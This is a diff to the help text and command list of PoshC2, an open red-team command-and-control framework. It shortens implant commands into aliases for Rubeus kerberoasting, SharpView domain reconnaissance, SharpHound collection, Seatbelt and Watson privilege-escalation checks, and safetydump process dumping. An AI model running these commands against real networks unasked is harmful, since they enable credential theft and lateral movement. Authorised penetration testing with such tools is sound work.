@@ -4,7 +4,7 @@ logopic = r"""
  __________            .__.     _________  ________
  \_______  \____  _____|  |__   \_   ___ \ \_____  \\
   |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/
-  |    |  ( <_>)___ \|   Y  \ \     \____/       \\
+  |    |  (  <_> )___ \|   Y  \ \     \____/       \\
   |____|   \____/____  >___|  /  \______  /\_______ \\
                      \/     \/          \/         \/
   =============== v4.8 www.PoshC2.co.uk =============
@@ -69,7 +69,6 @@ help
 searchhelp listmodules
 label-implant <newlabel>
 back
-safetydump
 
 Migration
 ===========
@@ -87,49 +86,38 @@ stop-keystrokes
 testadcredential domain username password
 testlocalcredential username password
 cred-popper
-loadmodule SharpUp.exe
-run-exe SharpUp.Program SharpUp
+sharpup
+seatbelt all
+seatbelt BasicOSInfo
+seatbelt SysmonConfig
+seatbelt PowerShellSettings
+seatbelt RegistryAutoRuns
+watson
 
-Privilege Escalation:
-=======================
-seatbelt
-loadmodule Seatbelt.exe
-run-exe Seatbelt.Program Seatbelt all
-run-exe Seatbelt.Program Seatbelt BasicOSInfo
-run-exe Seatbelt.Program Seatbelt SysmonConfig
-run-exe Seatbelt.Program Seatbelt PowerShellSettings
-run-exe Seatbelt.Program Seatbelt RegistryAutoRuns
-
-Credentials / Tokens / Local Hashes (Must be SYSTEM):
-=========================================================
+Process Dumping:
+================
 safetydump
 safetydump <pid>
 
 Network Tasks / Lateral Movement:
 ====================================
-loadmodule Rubeus.exe
-run-exe Rubeus.Program Rubeus kerberoast
-run-exe Rubeus.Program Rubeus asreproast /user:username
-
-Network Tasks / Lateral Movement:
-====================================
-loadmodule SharpView.exe
-run-exe SharpView.Program SharpView Get-NetUser -SamAccountName ben
-run-exe SharpView.Program SharpView Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
-run-exe SharpView.Program SharpView Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
-run-exe SharpView.Program SharpView Get-NetUser -Name deb -Domain blorebank.local
-run-exe SharpView.Program SharpView Get-NetSession -Domain blorebank.local
-run-exe SharpView.Program SharpView Get-DomainController -Domain blorebank.local
-run-exe SharpView.Program SharpView Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
-run-exe SharpView.Program SharpView Get-DomainUser -AdminCount -Properties samaccountname
-run-exe SharpView.Program SharpView Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
-run-exe SharpView.Program Sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
-run-exe SharpView.Program SharpView Find-InterestingDomainShareFile -ComputerName SERVER01
+rubeus kerberoast
+rubeus asreproast /user:username
+sharpview Get-NetUser -SamAccountName ben
+sharpview Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
+sharpview Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
+sharpview Get-NetUser -Name deb -Domain blorebank.local
+sharpview Get-NetSession -Domain blorebank.local
+sharpview Get-DomainController -Domain blorebank.local
+sharpview Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
+sharpview Get-DomainUser -AdminCount -Properties samaccountname
+sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
+sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
+sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
 
 Bloodhound:
 =============
-loadmodule SharpHound.exe
-run-exe Sharphound2.Sharphound Sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\
+sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\
 """
 
 posh_help1 = """
@@ -462,4 +450,5 @@ SHARPCOMMANDS = ["get-userinfo","stop-keystrokes","get-keystrokes","delete","mov
 "download-file","get-content","ls-recurse","turtle","cred-popper","resolveip","resolvednsname","testadcredential",
 "testlocalcredential","get-screenshot","modulesloaded","get-serviceperms","unhide-implant","arpscan","ls","pwd","dir",
 "inject-shellcode","start-process","run-exe","run-dll","hide-implant","help","searchhelp","listmodules","loadmodule",
-"loadmoduleforce","back","ps","beacon","setbeacon","kill-implant","get-screenshotmulti", "safetydump", "seatbelt"]
+"loadmoduleforce","back","ps","beacon","setbeacon","kill-implant","get-screenshotmulti", "safetydump", "seatbelt", "sharpup",
+"sharphound", "rubeus", "sharpview", "watson"]
